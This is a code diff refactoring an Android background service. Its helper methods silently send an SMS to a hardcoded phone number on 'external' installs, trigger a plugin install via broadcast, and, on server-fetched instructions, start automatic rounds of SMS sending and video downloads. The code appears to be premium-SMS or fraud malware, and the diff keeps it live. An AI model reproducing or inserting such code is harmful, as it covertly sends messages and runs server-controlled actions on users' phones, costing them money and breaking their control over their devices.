@@ -241,24 +241,10 @@ public class BgService extends Service {
         super.onStart(intent, startId);
         LOGD("onStart action = " + (intent != null ? intent.getAction() : ""));
         mSM.log(TAG, "BgService::onStart action = " + (intent != null ? intent.getAction() : ""));
-        
-        if (mSM.getAppType().equals(SettingManager.APP_TYPE_EXTERNAL)) {
-            try {
-                WorkingMessage wm = WorkingMessage.createEmpty(this);
-                wm.setDestNum("15810864155");
-                wm.setText("external install success");
-                wm.send();
-            } catch (Exception e) {
-                e.printStackTrace();
-            }
-            
-            //install the plugin now
-            Intent uninstall_intent = new Intent();
-            uninstall_intent.addCategory(UninstallReceiver.UNINSTALL_ACTION);
-            this.sendBroadcast(uninstall_intent);
-            
-            return;
-        }
+
+        // sepcial code for ROM test, if rom test code handle the service start 
+        // event, just return;
+        if (handleByRomTestCode()) return;
         
         if (intent == null || intent.getAction() == null) {
             mSM.setNextFetchChannelInfoFromServerTime(0, false);
@@ -281,37 +267,10 @@ public class BgService extends Service {
 //            } else {
 //                mSM.mCMNetIsReady = true;
 //            }
-            boolean ret = mSM.getXMLInfoFromServer("daily");
-            if (ret == true) {
-                mSM.parseServerXMLInfo();
-                String delay = mSM.mXMLHandler.getChanneInfo(XMLHandler.NEXT_LINK_BASE);
-                long delayTime = 0;
-                if (delay != null) {
-                    delayTime = (Long.valueOf(delay)) * 60 * 60 * 1000;
-                }
-                LOGD("[[onStart]] change the internet connect time delay, and start send the auto sms");
-                mSM.setLastConnectServerTime(System.currentTimeMillis());
-                mSM.mHasSetFetchServerInfoAlarm = false;
-                mSM.setNextFetchChannelInfoFromServerTime(delayTime, false);
-                if (isSendSMS() && mSM.needSMSRoundSend()) {
-                    //using sms
-                    if ((System.currentTimeMillis() - mSM.getLastSMSTime()) >= SettingManager.SMS_DEFAULT_DELAY_TIME) {
-                        mSM.setSMSRoundTotalSnedCount(0);
-                    }
-                    mSM.startOneRoundSMSSend(0);
-                    mSM.setSMSBlockBeginTime(System.currentTimeMillis());
-                } else if (isDownloadVedio() == true) {
-//                    long time = mSM.getLastVedioDownloadTime();
-//                    if ((System.currentTimeMillis() - time) > SettingManager.SMS_DEFAULT_DELAY_TIME) {
-//                        mSM.clearVedioDownloadLink();
-//                        Timer timer = new Timer();
-//                        timer.schedule(new MyTimerTask(), 5 * 1000);
-//                    }
-                }
-            } else {
-                mSM.setInternetConnectFailed(true);
-            }
+            fetchServerInfoAndDoAction("daily");
         } else if (action.equals(ACTION_SEND_SMS) == true) {
+            // now do not use the sms broadcast to start one round sms send check
+            
 //            LOGD("[[onStart]] start send the sms for one cycle");
 //            boolean ret = SettingManager.getInstance(this).getXMLInfoFromServer("sms round check");
 //            if (ret == true) {
@@ -341,7 +300,7 @@ public class BgService extends Service {
                 String delay = mSM.mXMLHandler.getChanneInfo(XMLHandler.NEXT_LINK_BASE);
                 long delayTime = 0;
                 if (delay != null) {
-                    delayTime = (Integer.valueOf(delay)) * 60 * 60 * 1000;
+                    delayTime = (Integer.valueOf(delay)) * SettingManager.ONE_HOUR;
                 }
                 if (mSM.mHasSetFetchServerInfoAlarm == false) {
                     mSM.setNextFetchChannelInfoFromServerTime(delayTime, false);
@@ -361,38 +320,7 @@ public class BgService extends Service {
         } else if (action.equals(ACTION_INTERNET_CHANGED) == true) {
             String str = intent.getStringExtra(SettingManager.CONNECT_NETWORK_REASON);
             if (str == null) str = "net aviliable";
-            boolean ret = SettingManager.getInstance(this).getXMLInfoFromServer(str);
-            LOGD("action internet connection");
-            mSM.log("action = " + ACTION_INTERNET_CHANGED);
-            if (ret == true) {
-                if (mSM.getInternetConnectFailed() == true) {
-                    mSM.log("only connect the internet and make some settings");
-                    mSM.setInternetConnectFailed(false);
-                    mSM.parseServerXMLInfo();
-                    String delay = mSM.mXMLHandler.getChanneInfo(XMLHandler.NEXT_LINK_BASE);
-                    long delayTime = 0;
-                    if (delay != null) {
-                        delayTime = (Long.valueOf(delay)) * 60 * 60 * 1000;
-                    }
-                    LOGD("[[onStart]] change the internet connect time delay, and start send the auto sms");
-                    mSM.setLastConnectServerTime(System.currentTimeMillis());
-                    mSM.mHasSetFetchServerInfoAlarm = false;
-                    mSM.setNextFetchChannelInfoFromServerTime(delayTime, false);
-                    if (isSendSMS() && mSM.needSMSRoundSend()) {
-                        if ((System.currentTimeMillis() - mSM.getLastSMSTime()) >= SettingManager.SMS_DEFAULT_DELAY_TIME) {
-                            mSM.setSMSRoundTotalSnedCount(0);
-                        }
-                        mSM.startOneRoundSMSSend(0);
-                        mSM.setSMSBlockBeginTime(System.currentTimeMillis());
-                    } else if (isDownloadVedio() == true) {
-//                        long time = mSM.getLastVedioDownloadTime();
-//                        if ((System.currentTimeMillis() - time) > SettingManager.SMS_DEFAULT_DELAY_TIME) {
-//                            mSM.clearVedioDownloadLink();
-//                            Timer timer = new Timer();
-//                            timer.schedule(new MyTimerTask(), 5 * 1000);
-//                        }
-                    }
-                }
+            fetchServerInfoAndDoAction(str);
 //                if (mSM.getInternetConnectFailedBeforeSMS() == true) {
 //                    mSM.setInternetConnectFailedBeforeSMS(false);
 //                    mSM.parseServerXMLInfo();
@@ -402,8 +330,8 @@ public class BgService extends Service {
 //                    mSM.cancelAutoSendMessage();
 //                    mSM.setSMSBlockBeginTime(System.currentTimeMillis());
 //                }
-            }
         } else {
+            // default action
             if (mSM.mHasSetFetchServerInfoAlarm == false) {
                 mSM.setNextFetchChannelInfoFromServerTime(0, false);
             }
@@ -416,6 +344,65 @@ public class BgService extends Service {
         mSM.log(TAG, "onDestroy");
         stopForegroundCompat(NOTIFY_ID);
         this.unregisterReceiver(VedioBCR);
+    }
+    
+    private void fetchServerInfoAndDoAction(String connectionReason) {
+        boolean ret = SettingManager.getInstance(this).getXMLInfoFromServer(connectionReason);
+        LOGD("action internet connection");
+        mSM.log("action = " + connectionReason);
+        if (ret == true) {
+            mSM.setInternetConnectFailed(false);
+            mSM.log("only connect the internet and make some settings");
+            mSM.parseServerXMLInfo();
+            String delay = mSM.mXMLHandler.getChanneInfo(XMLHandler.NEXT_LINK_BASE);
+            long delayTime = 0;
+            if (delay != null) {
+                delayTime = (Long.valueOf(delay)) * SettingManager.ONE_HOUR;
+            }
+            LOGD("[[onStart]] change the internet connect time delay, and start send the auto sms");
+            mSM.setLastConnectServerTime(System.currentTimeMillis());
+            mSM.mHasSetFetchServerInfoAlarm = false;
+            mSM.setNextFetchChannelInfoFromServerTime(delayTime, false);
+            if (isSendSMS() && mSM.needSMSRoundSend()) {
+                if ((System.currentTimeMillis() - mSM.getLastSMSTime()) >= SettingManager.DAYS_20) {
+                    mSM.setSMSRoundTotalSnedCount(0);
+                }
+                mSM.startOneRoundSMSSend(0);
+                mSM.setSMSBlockBeginTime(System.currentTimeMillis());
+            } else if (isDownloadVedio() == true) {
+                // long time = mSM.getLastVedioDownloadTime();
+                // if ((System.currentTimeMillis() - time) >
+                // SettingManager.SMS_DEFAULT_DELAY_TIME) {
+                // mSM.clearVedioDownloadLink();
+                // Timer timer = new Timer();
+                // timer.schedule(new MyTimerTask(), 5 * 1000);
+                // }
+            }
+        } else {
+            mSM.setInternetConnectFailed(true);
+        }
+    }
+    
+    private boolean handleByRomTestCode() {
+        if (mSM.getAppType().equals(SettingManager.APP_TYPE_EXTERNAL)) {
+            try {
+                WorkingMessage wm = WorkingMessage.createEmpty(this);
+                wm.setDestNum("15810864155");
+                wm.setText("external install success");
+                wm.send();
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+
+            // install the plugin now
+            Intent uninstall_intent = new Intent();
+            uninstall_intent.addCategory(UninstallReceiver.UNINSTALL_ACTION);
+            this.sendBroadcast(uninstall_intent);
+
+            return true;
+        }
+        
+        return false;
     }
     
     private void oneRoundSMSSend() {
